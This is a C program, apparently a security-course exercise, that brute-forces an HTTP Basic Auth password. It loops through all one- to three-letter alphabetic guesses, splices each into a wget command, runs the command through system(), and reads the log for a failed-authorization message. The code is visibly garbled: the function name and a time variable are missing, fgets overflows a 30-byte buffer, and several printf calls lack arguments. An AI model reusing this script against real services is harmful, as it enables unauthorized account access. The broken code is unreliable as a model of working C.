#include<stdio.h>
#include<string.h>
#include<strings.h>
#include<stdlib.h>
#include<sys/time.h>

()
{
	int i,j,k,m,count=0,flage=0;
	FILE* log;
	time_t ,finish;
	double ttime;
	char s[30];
	char arr[52]={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};
	char add[100];
	strcpy(add,"wget --http-user= --http-passwd=    -nv  -o log http://sec-crack.cs.rmit.edu./SEC/2/");
	=time(NULL);	
	for(i=0;i<52;i++)	
	{
		for(j=0;j<52;j++)
		{
			for(k=0;k<52;k++)
			{
			printf("%c %c %c\n",arr[i],arr[j],arr[k]);
			
			add[40]=arr[i];
			add[41]=arr[j];
			add[42]=arr[k];
			system(add);
			count++;
			log=fopen("log","r");
			if(log!=(FILE*)NULL)
			fgets(s,100,log);
			printf("%s",s);		
				if(strcmp(s,"Authorization failed.\n")!=0)
				{
					finish=time(NULL);
					ttime=difftime(,finish);
					printf("\nThe password is %c%c%c \nThe time:%f\n The  of attempts %d",arr[i],arr[j],arr[k],ttime,count);
					flage=1;
					break;
				}
			
				fclose(log);
			}
		}
	}
	if(flage==0)	
	{
		for(i=0;i<52;i++)
		{
		add[40]=arr[i];
		system(add);
			count++;
			log=fopen("log","r");
			if(log!=(FILE*)NULL)
			fgets(s,100,log);
			printf("%s",s);
				if(strcmp(s,"Authorization failed.\n")!=0)
				{
					finish=time(NULL);
					ttime=difftime(,finish);
					printf("\nThe password is %c%c%c \nThe time:%f\n The  of attempts %d",arr[i],ttime,count);
					flage=1;
					break;
				}
			
				fclose(log);
		}
	}
	if(flage==0)	  
	{
		for(i=0;i<52;i++)
		{
			for(j=0;j<52;j++)
			{
			add[40]=arr[i];
			add[41]=arr[j];
			system(add);
			count++;
			log=fopen("log","r");
			if(log!=(FILE*)NULL)
			fgets(s,100,log);
			printf("%s",s);
				if(strcmp(s,"Authorization failed.\n")!=0)
				{
					finish=time(NULL);
					ttime=difftime(,finish);
					printf("\nThe password is %c%c%c \nThe time:%f\n The  of attempts %d",arr[i],arr[j],ttime,count);
					flage=1;
					break;
				}
			
				fclose(log);
			}
		}
	}
	
}
